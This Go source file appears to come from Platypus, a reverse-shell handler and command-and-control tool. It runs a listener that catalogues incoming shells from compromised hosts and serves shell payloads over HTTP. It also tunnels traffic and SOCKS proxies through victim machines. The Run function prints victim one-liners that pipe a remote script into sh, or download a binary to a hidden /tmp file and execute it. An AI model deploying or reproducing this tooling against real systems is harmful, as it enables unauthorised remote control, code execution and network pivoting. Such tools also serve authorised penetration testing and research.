package context

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/crypto"
	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	"github.com/WangYihang/Platypus/lib/util/message"
	"github.com/WangYihang/Platypus/lib/util/network"
	"github.com/WangYihang/Platypus/lib/util/raas"
	"github.com/WangYihang/Platypus/lib/util/str"
	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
	"github.com/phayes/freeport"
)

type WebSocketMessage struct {
	Type WebSocketMessageType
	Data interface{}
}

type TCPServer struct {
	Host           string                      `json:"host"`
	GroupDispatch  bool                        `json:"group_dispatch"`
	Port           uint16                      `json:"port"`
	Clients        map[string](*TCPClient)     `json:"clients"`
	TermiteClients map[string](*TermiteClient) `json:"termite_clients"`
	TimeStamp      time.Time                   `json:"timestamp"`
	Interfaces     []string                    `json:"interfaces"`
	Hash           string                      `json:"hash"`
	Encrypted      bool                        `json:"encrypted"`
	DisableHistory bool                        `json:"disable_history"`
	PublicIP       string                      `json:"public_ip"`
	hashFormat     string
	stopped        chan struct{}
}

func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool, disableHistory bool, PublicIP string) *TCPServer {
	service := fmt.Sprintf("%s:%d", host, port)

	if Ctx.Servers[hash.MD5(service)] != nil {
		log.Error("The server (%s) already exists", service)
		return nil
	}

	// Default hashFormat
	if hashFormat == "" {
		hashFormat = "%i %u %m %o %t"
	}

	tcpServer := &TCPServer{
		Host:           host,
		Port:           port,
		GroupDispatch:  true,
		Clients:        make(map[string](*TCPClient)),
		TermiteClients: make(map[string](*TermiteClient)),
		Interfaces:     []string{},
		TimeStamp:      time.Now(),
		hashFormat:     hashFormat,
		Hash:           hash.MD5(fmt.Sprintf("%s:%d", host, port)),
		stopped:        make(chan struct{}, 1),
		Encrypted:      encrypted,
		DisableHistory: disableHistory,
		PublicIP:       PublicIP,
	}

	Ctx.Servers[hash.MD5(service)] = tcpServer

	// Gather listening interfaces
	tcpServer.Interfaces = network.GatherInterfacesList(tcpServer.Host)

	// Support for distributor for termite
	if encrypted {
		for _, ifaddr := range tcpServer.Interfaces {
			routeKey := str.RandomString(0x08)
			Ctx.Distributor.Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
		}
	}

	// Fetch real public IP address if not specified
	if tcpServer.PublicIP == "" {
		log.Info("Detecting Public IP address of the interface...")
		ip, err := network.GetPublicIP()
		if err != nil {
			log.Error("Public IP Detection failed: %s", err.Error())
		}
		tcpServer.PublicIP = ip
		log.Success("Public IP Detected: %s", tcpServer.PublicIP)
	} else {
		log.Info("Public IP (%s) is set in config file.", tcpServer.PublicIP)
	}

	// Try to check
	log.Info("Trying to create server on: %s", service)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	}

	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	} else {
		listener.Close()
	}

	return tcpServer
}

func (s *TCPServer) Handle(conn net.Conn) {
	if s.Encrypted {
		client := CreateTermiteClient(conn, s, s.DisableHistory)
		// Send gather info request
		log.Info("Gathering information from client...")
		if client.GatherClientInfo(s.hashFormat) {
			log.Info("A new encrypted income connection from %s", client.conn.RemoteAddr())
			s.AddTermiteClient(client)
		} else {
			log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
			client.Close()
		}
	} else {
		client := CreateTCPClient(conn, s)
		log.Info("A new income connection from %s", client.conn.RemoteAddr())
		// Reverse shell as a service
		buffer := make([]byte, 4)
		client.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
		client.readLock.Lock()
		n, err := client.conn.Read(buffer)
		client.readLock.Unlock()
		client.conn.SetReadDeadline(time.Time{})
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Debug("Not requesting for service")
			} else {
				client.Close()
			}
		}
		if string(buffer[:n]) == "GET " {
			requestURI := client.ReadUntilClean(" ")
			// Read HTTP Version
			client.ReadUntilClean("\r\n")
			httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
			for {
				var line = client.ReadUntilClean("\r\n")
				// End of headers
				if line == "" {
					log.Debug("All header read")
					break
				}
				delimiter := ":"
				index := strings.Index(line, delimiter)
				headerKey := line[:index]
				headerValue := strings.Trim(line[index+len(delimiter):], " ")
				if headerKey == "Host" {
					httpHost = headerValue
				}
			}
			command := fmt.Sprintf("%s\n", raas.URI2Command(requestURI, httpHost))
			client.Write([]byte("HTTP/1.0 200 OK\r\n"))
			client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
			client.Write([]byte("\r\n"))
			client.Write([]byte(command))
			client.Close()
			log.Info("A RaaS request from %s served", client.conn.RemoteAddr().String())
		} else {
			s.AddTCPClient(client)
		}
	}
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}

	var listener net.Listener
	if s.Encrypted {
		certBuilder := new(strings.Builder)
		keyBuilder := new(strings.Builder)
		crypto.Generate(certBuilder, keyBuilder)

		pemContent := []byte(fmt.Sprint(certBuilder))
		keyContent := []byte(fmt.Sprint(keyBuilder))

		cert, err := tls.X509KeyPair(pemContent, keyContent)

		if err != nil {
			log.Error("Encrypted server failed to loadkeys: %s", err)
			Ctx.DeleteServer(s)
			return
		}
		config := tls.Config{Certificates: []tls.Certificate{cert}}
		config.Rand = rand.Reader
		listener, _ = tls.Listen("tcp", service, &config)
	} else {
		listener, err = net.ListenTCP("tcp", tcpAddr)
	}

	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(s)
		return
	}
	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))

	if s.Encrypted {
		for _, ifname := range s.Interfaces {
			listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
			log.Warn("Connect back to: %s", listenerHostPort)
			for _, ifaddr := range Ctx.Distributor.Interfaces {
				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.Port)
				filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
				log.Warn("\t`%s`", command)
			}
		}
	} else {
		for _, ifname := range s.Interfaces {
			log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
		}
	}

	for {
		select {
		case <-s.stopped:
			listener.Close()
			return
		default:
			var err error
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go s.Handle(conn)
		}
	}
}

func (s *TCPServer) AsTable() {
	if len(s.Clients) > 0 || len(s.TermiteClients) > 0 {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.SetTitle(fmt.Sprintf(
			"%s is listening on %s:%d, %d clients",
			s.Hash,
			(*s).Host,
			(*s).Port,
			len((*s).Clients),
		))

		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})

		for chash, client := range s.Clients {
			t.AppendRow([]interface{}{
				chash,
				client.conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				client.Python2 != "" || client.Python3 != "",
				humanize.Time(client.TimeStamp),
				client.Alias,
				client.GroupDispatch,
			})
		}

		for chash, client := range s.TermiteClients {
			t.AppendRow([]interface{}{
				chash,
				client.conn.RemoteAddr().String(),
				client.OS.String(),
				client.User,
				client.Python2 != "" || client.Python3 != "",
				humanize.Time(client.TimeStamp),
				client.Alias,
				"",
			})
		}

		t.Render()
		log.Success(fmt.Sprintf(
			"%s is listening on %s:%d, %d clients listed",
			s.Hash,
			(*s).Host,
			(*s).Port,
			len((*s).Clients)+len((*s).TermiteClients),
		))
	} else {
		log.Warn(fmt.Sprintf(
			"[%s] is listening on %s:%d, 0 clients",
			s.Hash,
			(*s).Host,
			(*s).Port,
		))
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.Clients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash,
			s.Host,
			s.Port,
			len(s.Clients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.Clients {
		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
	s.stopped <- struct{}{}

	// Connect to the listener, in order to call listener.Close() immediately
	// See: https://github.com/golang/go/issues/32610
	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", s.Host, s.Port))
	if conn != nil {
		conn.Close()
	}

	for _, client := range s.Clients {
		s.DeleteTCPClient(client)
	}
}

type WebSocketMessageType int

const (
	CLIENT_CONNECTED WebSocketMessageType = iota
	CLIENT_DUPLICATED
	SERVER_DUPLICATED
	COMPILING_TERMITE
	COMPRESSING_TERMITE
	UPLOADING_TERMITE
)

func (s *TCPServer) NotifyWebSocketDuplicateTCPClient(client *TCPClient) {
	// WebSocket Broadcast
	type ClientDuplicateMessage struct {
		Client     TCPClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_DUPLICATED,
		Data: ClientDuplicateMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	Ctx.NotifyWebSocket.Broadcast(msg)
}

func (s *TCPServer) NotifyWebSocketOnlineTCPClient(client *TCPClient) {
	// WebSocket Broadcast
	type ClientOnlineMessage struct {
		Client     TCPClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_CONNECTED,
		Data: ClientOnlineMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	Ctx.NotifyWebSocket.Broadcast(msg)
}

func (s *TCPServer) AddTCPClient(client *TCPClient) {
	client.GroupDispatch = s.GroupDispatch
	client.GatherClientInfo(s.hashFormat)
	if _, exists := s.Clients[client.Hash]; exists {
		log.Error("Duplicated income connection detected!")
		s.NotifyWebSocketDuplicateTCPClient(client)
		client.Close()
	} else {
		log.Success("Fire in the hole: %s", client.OnelineDesc())
		s.Clients[client.Hash] = client
		s.NotifyWebSocketOnlineTCPClient(client)
	}
}

func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
	delete(s.Clients, client.Hash)
	client.Close()
}

func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
	return s.Clients
}

func (s *TCPServer) NotifyWebSocketDuplicateTermiteClient(client *TermiteClient) {
	// WebSocket Broadcast
	type ClientDuplicateMessage struct {
		Client     TermiteClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_DUPLICATED,
		Data: ClientDuplicateMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	Ctx.NotifyWebSocket.Broadcast(msg)
}

func (s *TCPServer) NotifyWebSocketOnlineTermiteClient(client *TermiteClient) {
	// WebSocket Broadcast
	type ClientOnlineMessage struct {
		Client     TermiteClient
		ServerHash string
	}
	msg, _ := json.Marshal(WebSocketMessage{
		Type: CLIENT_CONNECTED,
		Data: ClientOnlineMessage{
			Client:     *client,
			ServerHash: s.Hash,
		},
	})
	// Notify to all websocket clients
	Ctx.NotifyWebSocket.Broadcast(msg)
}

// Encrypted clients
func (s *TCPServer) AddTermiteClient(client *TermiteClient) {
	if _, exists := s.TermiteClients[client.Hash]; exists {
		log.Error("Duplicated income connection detected!")

		// Respond to termite client that the client is duplicated
		client.EncoderLock.Lock()
		err := client.Encoder.Encode(message.Message{
			Type: message.DUPLICATED_CLIENT,
			Body: message.BodyDuplicateClient{},
		})
		client.EncoderLock.Unlock()
		if err != nil {
			// TODO: handle network error
			log.Error("Network error: %s", err)
		}

		s.NotifyWebSocketDuplicateTermiteClient(client)
		client.Close()
	} else {
		log.Success("Encrypted fire in the hole: %s", client.OnelineDesc())
		s.TermiteClients[client.Hash] = client
		s.NotifyWebSocketOnlineTermiteClient(client)
		// Message Dispatcher
		go func(client *TermiteClient) { TermiteMessageDispatcher(client) }(client)
	}
}

func TermiteMessageDispatcher(client *TermiteClient) {
	for {
		msg := &message.Message{}
		// Read message
		client.DecoderLock.Lock()
		err := client.Decoder.Decode(msg)
		client.DecoderLock.Unlock()
		if err != nil {
			log.Error("Read from client %s failed", client.OnelineDesc())
			Ctx.DeleteTermiteClient(client)
			break
		}

		var key string
		switch msg.Type {
		case message.STDIO:
			key = msg.Body.(*message.BodyStdio).Key
			if process, exists := client.Processes[key]; exists {
				if process.WebSocket != nil {
					process.WebSocket.WriteBinary([]byte("0" + string(msg.Body.(*message.BodyStdio).Data)))
				} else {
					os.Stdout.Write(msg.Body.(*message.BodyStdio).Data)
				}
			} else {
				log.Debug("No such key: %s", key)
			}
		case message.PROCESS_STARTED:
			key = msg.Body.(*message.BodyProcessStarted).Key
			if process, exists := client.Processes[key]; exists {
				process.Pid = msg.Body.(*message.BodyProcessStarted).Pid
				process.State = Started
				log.Success("Process (%d) started", process.Pid)
				if process.WebSocket == nil {
					client.CurrentProcessKey = key
				}
			} else {
				log.Debug("No such key: %s", key)
			}
		case message.PROCESS_STOPED:
			key = msg.Body.(*message.BodyProcessStoped).Key
			if process, exists := client.Processes[key]; exists {
				code := msg.Body.(*message.BodyProcessStoped).Code
				process.State = Terminated
				delete(client.Processes, key)
				log.Error("Process (%d) stop: %d", process.Pid, code)
				if process.WebSocket == nil {
					client.CurrentProcessKey = ""
				}
			} else {
				log.Debug("No such key: %s", key)
			}
		case message.PULL_TUNNEL_CONNECTED:
			token := msg.Body.(*message.BodyPullTunnelConnected).Token
			log.Success("Tunnel (%s) connected", token)
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				go func() {
					for {
						buffer := make([]byte, 0x400)
						n, err := (*ti.Conn).Read(buffer)
						if err != nil {
							log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
							ti.Termite.EncoderLock.Lock()
							ti.Termite.Encoder.Encode(message.Message{
								Type: message.PULL_TUNNEL_DISCONNECT,
								Body: message.BodyPullTunnelDisconnect{
									Token: token,
								},
							})
							ti.Termite.EncoderLock.Unlock()
							(*ti.Conn).Close()
							break
						} else {
							if n > 0 {
								WriteTunnel(ti.Termite, token, buffer[0:n])
							}
						}
					}
				}()
			} else {
				log.Debug("No such connection")
			}
		case message.PULL_TUNNEL_CONNECT_FAILED:
			token := msg.Body.(*message.BodyPullTunnelConnectFailed).Token
			reason := msg.Body.(*message.BodyPullTunnelConnectFailed).Reason
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				log.Error("Connecting to %s failed: %s", token, reason)
				(*ti.Conn).Close()
				delete(Ctx.PullTunnelInstance, token)
			} else {
				log.Debug("No such connection")
			}
		case message.PULL_TUNNEL_DISCONNECTED:
			token := msg.Body.(*message.BodyPullTunnelDisconnected).Token
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				log.Error("%s disconnected", token)
				(*ti.Conn).Close()
				delete(Ctx.PullTunnelInstance, token)
			} else {
				log.Debug("No such connection")
			}
		case message.PULL_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPullTunnelData).Token
			data := msg.Body.(*message.BodyPullTunnelData).Data
			if ti, exists := Ctx.PullTunnelInstance[token]; exists {
				(*ti.Conn).Write(data)
			} else {
				log.Debug("No such connection")
			}
		case message.PUSH_TUNNEL_CONNECT:
			token := msg.Body.(*message.BodyPushTunnelConnect).Token
			address := msg.Body.(*message.BodyPushTunnelConnect).Address
			if tc, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Info("Connecting to %s", tc.Address)
				conn, err := net.Dial("tcp", tc.Address)
				if err != nil {
					log.Error("Connecting to %s failed: %s", tc.Address, err.Error())
					tc.Termite.EncoderLock.Lock()
					tc.Termite.Encoder.Encode(message.Message{
						Type: message.PUSH_TUNNEL_CONNECT_FAILED,
						Body: message.BodyPushTunnelConnectFailed{
							Token:  token,
							Reason: err.Error(),
						},
					})
					tc.Termite.EncoderLock.Unlock()
				} else {
					log.Success("Connecting to %s succeed", tc.Address)
					Ctx.PushTunnelInstance[token] = PushTunnelInstance{
						Termite: tc.Termite,
						Conn:    &conn,
					}
					tc.Termite.EncoderLock.Lock()
					tc.Termite.Encoder.Encode(message.Message{
						Type: message.PUSH_TUNNEL_CONNECTED,
						Body: message.BodyPushTunnelConnected{
							Token: token,
						},
					})
					tc.Termite.EncoderLock.Unlock()
					go func() {
						for {
							buffer := make([]byte, 0x400)
							n, err := conn.Read(buffer)
							if err != nil {
								log.Debug("Reading from %s failed: %s", tc.Address, err.Error())
								tc.Termite.EncoderLock.Lock()
								tc.Termite.Encoder.Encode(message.Message{
									Type: message.PUSH_TUNNEL_DISCONNECTED,
									Body: message.BodyPushTunnelDisonnected{
										Token:  token,
										Reason: err.Error(),
									},
								})
								tc.Termite.EncoderLock.Unlock()
								conn.Close()
								delete(Ctx.PushTunnelInstance, token)
								break
							} else {
								log.Debug("%d bytes read from %s", n, tc.Address)
								tc.Termite.EncoderLock.Lock()
								tc.Termite.Encoder.Encode(message.Message{
									Type: message.PUSH_TUNNEL_DATA,
									Body: message.BodyPushTunnelData{
										Token: token,
										Data:  buffer[0:n],
									},
								})
								tc.Termite.EncoderLock.Unlock()
							}
						}
					}()
				}
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_DISCONNECT:
			token := msg.Body.(*message.BodyPushTunnelDisonnect).Token
			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
				log.Success("Tunnel %v closed", (*ti.Conn).RemoteAddr().String())
				(*ti.Conn).Close()
				delete(Ctx.PushTunnelInstance, token)
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_DISCONNECTED:
			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
				(*ti.Conn).Close()
				delete(Ctx.PushTunnelInstance, token)
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_CREATED:
			address := msg.Body.(*message.BodyPushTunnelCreated).Address
			if tc, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Success("Tunnel created: %s", tc.Address)
			} else {
				log.Debug("No such tunnel: %s", address)
			}
		case message.PUSH_TUNNEL_CREATE_FAILED:
			address := msg.Body.(*message.BodyPushTunnelCreateFailed).Address
			reason := msg.Body.(*message.BodyPushTunnelCreateFailed).Reason
			if tc, exists := Ctx.PushTunnelConfig[address]; exists {
				log.Success("Tunnel (%s) create failed: %s", tc.Address, reason)
				delete(Ctx.PushTunnelConfig, address)
			} else {
				log.Debug("No such tunnel: %s", address)
			}
		case message.PUSH_TUNNEL_DELETED:
			// TODO
			log.Info("PUSH_TUNNEL_DELETED")
		case message.PUSH_TUNNEL_DELETE_FAILED:
			// TODO
			log.Info("PUSH_TUNNEL_DELETE_FAILED")
		case message.PUSH_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPushTunnelData).Token
			data := msg.Body.(*message.BodyPushTunnelData).Data
			if ti, exists := Ctx.PushTunnelInstance[token]; exists {
				_, err := (*ti.Conn).Write(data)
				if err != nil {
					ti.Termite.EncoderLock.Lock()
					ti.Termite.Encoder.Encode(message.Message{
						Type: message.PUSH_TUNNEL_CONNECT_FAILED,
						Body: message.BodyPushTunnelConnectFailed{
							Token:  token,
							Reason: err.Error(),
						},
					})
					ti.Termite.EncoderLock.Unlock()
					(*ti.Conn).Close()
					delete(Ctx.PushTunnelInstance, token)
				}
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.DYNAMIC_TUNNEL_CREATED:
			port := msg.Body.(*message.BodyDynamicTunnelCreated).Port
			local_address := fmt.Sprintf("127.0.0.1:%d", freeport.GetPort())
			remote_address := fmt.Sprintf("127.0.0.1:%d", port)
			log.Success("Mapping remote socks server (%s) into local address (%s)", remote_address, local_address)
			AddPullTunnelConfig(
				Ctx.CurrentTermite,
				local_address,
				remote_address,
			)
		case message.DYNAMIC_TUNNEL_CREATE_FAILED:
			log.Error(msg.Body.(*message.BodyDynamicTunnelCreateFailed).Reason)
		}
	}
}

func (s *TCPServer) DeleteTermiteClient(client *TermiteClient) {
	delete(s.TermiteClients, client.Hash)
	client.Close()
}

func (s *TCPServer) GetAllTermiteClients() map[string](*TermiteClient) {
	return s.TermiteClients
}
